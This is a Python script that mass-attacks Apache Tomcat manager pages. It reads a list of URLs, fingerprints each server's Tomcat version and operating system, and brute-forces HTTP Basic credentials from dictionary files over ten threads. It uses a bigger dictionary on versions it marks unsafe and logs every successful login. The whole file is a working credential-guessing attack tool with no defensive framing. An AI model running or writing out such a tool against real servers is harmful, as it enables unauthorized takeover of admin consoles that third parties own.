#-*-coding:utf-8-*-

from urllib import request,error
import ssl
ssl._create_default_https_context = ssl._create_unverified_context
import base64
import threading
lock = threading.RLock()
import re
from concurrent.futures import ThreadPoolExecutor
import socket
socket.timeout=5
import time
from module import dofile

headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0"}
linux_safe_banner = "6.0.51"
windows_safe_banner = "7.0.8"
delay_time = 0.03
now = time.strftime("%Y%m%d%H%M",time.localtime())

def echo_result(content):
    lock.acquire()
    print(content)
    lock.release()

def writedownlog(content):
    logfile = "./log/tomcat_%s.txt" % now
    lock.acquire()
    dofile.writelog(logfile, content)
    lock.release()

def basicCrake(account,url):
    auth_token = "basic " + base64.b64encode(account).decode()
    try:
        rr_hander = request.Request(url, headers=headers)
        rr_hander.add_header("Authorization",auth_token)
        rr = request.urlopen(rr_hander)
    except:
        return False
    else:
        return True

def tomcat_banner(url):
    try:
        rr = request.urlopen(url)
    except error.HTTPError as e:
        if e.code == 401:
            try:
                url_tmp = url.replace("manager/html","xdfafi")
                rr = request.urlopen(url_tmp)
            except error.HTTPError as e:
                if e.code == 404:
                    text = e.read().decode()
                    banner = re.search("Apache Tomcat/\d{1,2}\.\d\.\d{1,3}",text)
                    if banner:
                        banner = re.search("\d{1,2}\.\d\.\d{1,3}",banner.group())
                        if banner:
                            return banner.group()
            except:
                pass
            return "99.0.0"
    except:
        pass
    return False

def tomcat_os(url):
    try:
        url_test = url[0:-3]+url[-3::].upper()
        rr = request.urlopen(url_test)
    except error.HTTPError as e:
        if e.code == 404:
            return "L"
    except:
        pass
    return "W"

def fk_tomcat(url,accunt_dic,org_banner):
    for accunt in accunt_dic:
        flag = basicCrake(accunt,url)
        accunt = accunt.decode()
        if flag:
            content = url + " " + str(org_banner) +" success! " + accunt
            echo_result(content)
            writedownlog(content)
            return 0
        time.sleep(delay_time)
    content = url + " " + str(org_banner) +" false"
    echo_result(content)
    return 0

def tomcat_main(urls_file,small_dic,big_dic):
    urls = dofile.readfile(urls_file)
    accunt_little = dofile.readfile(small_dic)
    accunt_big = dofile.readfile(big_dic)
    cpu = ThreadPoolExecutor(10)
    urls_num = len(urls)
    print("time:",now,"urls:",urls_num)
    doing = 0
    for url in urls:
        doing += 1
        url = url.decode()
        org_banner = tomcat_banner(url)
        if not org_banner:
            print(url,"error!")
            continue
        tomcat_system = tomcat_os(url)
        if tomcat_system == "L":
            safe_banner = linux_safe_banner.split(".")
        else:
            safe_banner = windows_safe_banner.split(".")
        banner = org_banner.split(".")
        if int(safe_banner[0]) > int(banner[0]):
            unsafe = True
        elif int(safe_banner[0]) == int(banner[0]):
            if int(safe_banner[1]) == int(banner[1]):
                if int(safe_banner[2]) > int(banner[2]):
                    unsafe = True
                else:
                    unsafe = False
            else:
                unsafe = False
        else:
            unsafe = False
        print(url, org_banner ,"unsafe:",unsafe,"working...",str(doing)+"/"+str(urls_num))
        if unsafe:
            cpu.submit(fk_tomcat,url,accunt_big,org_banner)
        else:
            cpu.submit(fk_tomcat,url,accunt_little,org_banner)

